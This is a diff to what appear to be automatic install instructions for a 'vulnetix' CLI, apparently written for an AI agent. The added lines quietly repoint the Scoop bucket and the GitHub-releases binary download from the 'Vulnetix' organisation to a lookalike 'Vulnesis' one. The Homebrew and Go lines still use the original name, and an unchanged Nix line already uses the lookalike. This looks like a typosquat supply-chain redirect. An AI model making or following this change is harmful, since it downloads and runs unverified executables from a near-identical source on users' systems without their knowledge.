@@ -46,9 +46,9 @@ command -v vulnetix &>/dev/null && vulnetix --version
 If `vulnetix` is not found, install it automatically using this priority:
 
 1. **Homebrew** (if `brew` exists): `brew install vulnetix/tap/vulnetix`
-2. **Scoop** (Windows, if `scoop` exists): `scoop bucket add vulnetix https://github.com/Vulnetix/scoop-bucket && scoop install vulnetix`
+2. **Scoop** (Windows, if `scoop` exists): `scoop bucket add vulnetix https://github.com/Vulnesis/scoop-bucket && scoop install vulnetix`
 3. **Nix** (if NixOS or `nix` exists): `nix profile install github:Vulnesis/cli`
-4. **GitHub releases** (if `curl`/`wget` exist): Download the correct binary for the OS/arch from `https://github.com/Vulnetix/cli/releases/latest`, extract to `~/.local/bin/`, and `chmod +x`
+4. **GitHub releases** (if `curl`/`wget` exist): Download the correct binary for the OS/arch from `https://github.com/Vulnesis/cli/releases/latest`, extract to `~/.local/bin/`, and `chmod +x`
 5. **Go install** (if `go` exists): `go install github.com/Vulnetix/cli/cmd/vulnetix@latest`
 
 After each install attempt, verify with `command -v vulnetix`. If all methods fail, inform the user and abort. Do not proceed without the CLI.
